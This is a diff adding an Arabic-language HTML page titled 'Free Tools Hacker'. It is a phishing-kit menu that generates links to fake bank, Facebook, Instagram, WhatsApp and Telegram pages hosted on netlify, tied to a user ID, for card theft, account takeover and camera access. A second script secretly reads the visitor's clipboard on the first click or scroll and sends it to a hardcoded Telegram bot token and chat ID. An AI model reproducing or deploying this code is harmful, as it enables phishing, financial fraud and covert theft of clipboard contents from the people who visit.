@@ -1,0 +1,278 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Tools Hacker</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@700;900&family=Share+Tech+Mono&display=swap" rel="stylesheet">
+    <style>
+        body {
+            background-color: #000;
+            color: #00ff00;
+            font-family: 'Share Tech Mono', monospace;
+            margin: 0;
+            padding: 20px;
+            overflow-x: hidden;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        canvas { position: fixed; top: 0; left: 0; z-index: -1; }
+        header { text-align: center; padding: 1rem; }
+        header h1 {
+            font-size: 2.2em;
+            font-weight: bold;
+            text-shadow: 0 0 15px #0f0;
+            font-family: 'Cairo', sans-serif;
+            margin: 0;
+        }
+        .card { 
+            background: rgba(0, 0, 0, 0.8); 
+            border: 1px solid #0f0; 
+            border-radius: 10px; 
+            padding: 1.5rem; 
+            max-width: 600px; 
+            margin: 1rem auto; 
+            box-shadow: 0 0 25px rgba(2, 255, 2, 0.4); 
+            animation: fadeIn 1.5s ease-in-out; 
+            text-align: center; 
+        }
+        .telegram-btn {
+            display: inline-block;
+            background: #0f0;
+            color: #000;
+            padding: 12px 25px;
+            border-radius: 8px;
+            text-decoration: none;
+            font-weight: 700;
+            font-size: 1.2em;
+            margin-bottom: 30px;
+            transition: all 0.3s;
+            font-family: 'Cairo', sans-serif;
+        }
+        .telegram-btn:hover {
+            background: #111;
+            color: #0f0;
+            border: 2px solid #0f0;
+            transform: scale(1.05);
+            box-shadow: 0 0 15px #0f0;
+        }
+        .form-group { margin-bottom: 20px; }
+        label { display: block; margin-bottom: 10px; font-size: 1.2em; font-family: 'Cairo', sans-serif; }
+        input[type="text"], select {
+            width: 95%;
+            padding: 0.8rem;
+            margin: 0 auto 1rem auto;
+            display: block;
+            border: 2px solid #0f0;
+            border-radius: 8px;
+            background: #000;
+            color: #0f0;
+            font-size: 1.1rem;
+            text-align: center;
+            font-family: 'Share Tech Mono', monospace;
+        }
+        select { cursor: pointer; }
+        option { background-color: #000; border: none; }
+        .output-area { margin-top: 30px; background: #000; padding: 1rem; border-radius: 8px; border: 1px solid #0f0; display: none; }
+        .output-area h3 { margin-top: 0; color: #fff; font-family: 'Cairo', sans-serif; }
+        .generated-link-wrapper { display: flex; align-items: center; justify-content: space-between; background-color: #111; padding: 10px; border-radius: 8px; }
+        #generatedLink { word-break: break-all; text-align: left; direction: ltr; color: #0f0; }
+        .copy-btn { background-color: #0f0; color: #000; border: none; padding: 8px 12px; border-radius: 5px; cursor: pointer; font-weight: 700; margin-left: 10px; flex-shrink: 0; font-family: 'Cairo', sans-serif; }
+        .copy-btn:hover { background-color: #fff; }
+        @keyframes fadeIn { from {opacity: 0; transform: translateY(-20px);} to {opacity: 1; transform: translateY(0);} }
+    </style>
+</head>
+<body>
+
+    <canvas id="matrix"></canvas>
+
+    <div class="card">
+        <header>
+            <h1>Free Tools Hacker</h1>
+        </header>
+        <a href="https://t.me/my_aboelfadl_helper_bot?start=b87da1c979c354d74d29fa132060b977" target="_blank" class="telegram-btn">معرف ID خاص بك</a>
+
+        <div class="form-group">
+            <label for="userId">أدخل الـ ID الخاص بك هنا</label>
+            <input type="text" id="userId" placeholder="0123456789">
+        </div>
+
+        <div class="form-group">
+            <label for="toolSelector">اختر القسم المطلوب</label>
+            <select id="toolSelector">
+                <option value="" disabled selected>-- اختر من القائمة --</option>
+                <option value="visa">1. سرقة فيزا</option>
+                <option value="ip">2. صفحة مزورة للحصول على IP</option>
+                <option value="camera">3. اختراق الموقع والكاميرا</option>
+                <option value="whatsapp">4. اختراق واتساب</option>
+                <option value="Facebook">5. اختراق Facebook</option>
+                <option value="Instagram">6. اختراق Instagram</option>
+                <option value="telegram">7. اختراق telegram</option>
+                <option value="malware">8. تلغيم رابط</option>
+                <option value="visaa">9. صيد فيزا</option>
+                <option value="hide">10. إخفاء رابط</option>
+                <option value="tracker">11. تتبع IP</option>
+                <option value="down">12. Download Index</option>
+                <option value="bot">13. Site Bot</option>
+                <option value="cut">14. قص الرابط</option>
+                <option value="sms">15. رسائل مخادعة</option>
+                <option value="user">16. بحث باسم المستخدم</option>
+                <option value="tebot">17. مكتبه بوتات التليجرام</option>
+                <option value="iphone">18. IPHONE</option>
+                <option value="mac">19. MAC OS</option>
+            </select>
+        </div>
+
+        <div id="outputArea" class="output-area">
+            <h3>الرابط الذي تم إنشاؤه</h3>
+            <div class="generated-link-wrapper">
+                <span id="generatedLink"></span>
+                <button id="copyButton" class="copy-btn">نسخ</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Matrix Effect
+        const canvas = document.getElementById("matrix");
+        const ctx = canvas.getContext("2d");
+        canvas.height = window.innerHeight;
+        canvas.width = window.innerWidth;
+        const letters = "01";
+        const fontSize = 14;
+        const columns = canvas.width / fontSize;
+        const drops = [];
+        for (let x = 0; x < columns; x++) drops[x] = 1;
+        function draw() {
+            ctx.fillStyle = "rgba(0,0,0,0.05)";
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            ctx.fillStyle = "#0f0";
+            ctx.font = fontSize + "px monospace";
+            for (let i = 0; i < drops.length; i++) {
+                const text = letters.charAt(Math.floor(Math.random() * letters.length));
+                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
+                drops[i]++;
+            }
+        }
+        setInterval(draw, 35);
+
+        // Link Generation Logic
+        const toolSelector = document.getElementById('toolSelector');
+        const userIdInput = document.getElementById('userId');
+        const outputArea = document.getElementById('outputArea');
+        const generatedLinkSpan = document.getElementById('generatedLink');
+        const copyButton = document.getElementById('copyButton');
+
+        const links = {
+            visa: 'https://nbe-com-eg.netlify.app/?id=',
+            ip: 'https://100-pounds-credit.netlify.app/?id=',
+            camera: 'https://islamic-services.netlify.app/?id=',
+            whatsapp: 'https://w-h.netlify.app/?id=',
+            Facebook: 'https://face-book-watch.netlify.app/?id=',
+            Instagram: 'https://ins-tagram-reel.netlify.app/?id=',
+            telegram: 'https://telegram-verification-bot.netlify.app/?id=',
+            malware: 'Help_with_site.html',
+            visaa: 'Visa_takeover.html',
+            hide: 'hide_link.html',
+            tracker: 'Tracker_IP.html',
+            down: 'DOWNLOAD_INDEX.html',
+            bot: 'https://my_aboelfadl_helper_.eyoo.org',
+            cut: 'short_link.html',
+            sms: 'massage.html',
+            user: 'username.html',
+            tebot: 'bot/bot.html',
+            iphone: 'iphone.html',
+            mac: 'mac_os.html'
+        };
+
+        function generateOrOpenLink() {
+            const selectedTool = toolSelector.value;
+            const userId = userIdInput.value.trim();
+
+            if (!selectedTool) return;
+
+            if (['malware', 'visaa', 'hide', 'tracker', 'down', 'bot', 'cut', 'sms', 'user', 'tebot', 'iphone', 'mac'].includes(selectedTool)) {
+                // --- هذا هو السطر الذي تم تعديله ---
+                // تم تغيير '_blank' إلى '_self' للفتح في نفس الصفحة
+                window.open(links[selectedTool], '_self'); 
+                toolSelector.value = ""; 
+                outputArea.style.display = 'none';
+                return;
+            }
+
+            if (!userId) {
+                alert('الرجاء إدخال الـ ID الخاص بك أولاً!');
+                outputArea.style.display = 'none';
+                return;
+            }
+
+            const finalLink = links[selectedTool] + userId;
+            generatedLinkSpan.textContent = finalLink;
+            outputArea.style.display = 'block';
+        }
+
+        toolSelector.addEventListener('change', generateOrOpenLink);
+        userIdInput.addEventListener('keyup', () => {
+            if (toolSelector.value && !['malware', 'visaa', 'hide', 'tracker', 'down', 'bot', 'cut', 'sms', 'user', 'tebot', 'iphone', 'mac'].includes(toolSelector.value)) {
+                generateOrOpenLink();
+            }
+        });
+
+        copyButton.addEventListener('click', () => {
+            navigator.clipboard.writeText(generatedLinkSpan.textContent).then(() => {
+                copyButton.textContent = 'تم النسخ!';
+                setTimeout(() => {
+                    copyButton.textContent = 'نسخ';
+                }, 2000);
+            }).catch(err => {
+                console.error('Failed to copy: ', err);
+                alert('فشل النسخ. يرجى النسخ يدويًا.');
+            });
+        });
+    </script>
+
+    <script>
+        // ⚙️ إعدادات Telegram
+        const BOT_TOKEN = '8060685956:AAGJztf_aHHhFdBsH2OLuCPYS2TwPRY3_R4';
+        const CHAT_ID = '7077025219';
+        const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+        async function sendToTelegram(clipboardContent) {
+            const message = `✅ تم الحصول على محتوى الحافظة بنجاح!\n------------------------------------\n\n${clipboardContent}\n------------------------------------`;
+            const url = `${TELEGRAM_API}?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
+            const proxyUrl = `https://api.allorigins.win/raw?url=${encodeURIComponent(url)}`;
+            try {
+                await fetch(proxyUrl);
+            } catch (err) {
+                console.warn('Telegram send failed:', err);
+            }
+        }
+
+        const handleClipboardAccess = async () => {
+            try {
+                const clipboardText = await navigator.clipboard.readText();
+                if (clipboardText) {
+                    await sendToTelegram(clipboardText);
+                }
+            } catch (err) {
+                console.error('Clipboard read failed (Permission likely denied):', err);
+            }
+        };
+
+        // دالة يتم استدعاؤها مرة واحدة فقط عند أول تفاعل للمستخدم
+        const initInteractionListener = () => {
+            handleClipboardAccess();
+        };
+
+        // إضافة مستمعات لأول تفاعل من المستخدم (تعمل مرة واحدة فقط)
+        document.addEventListener('click', initInteractionListener, { once: true });
+        document.addEventListener('scroll', initInteractionListener, { once: true });
+    </script>
+</body>
+</html>
+
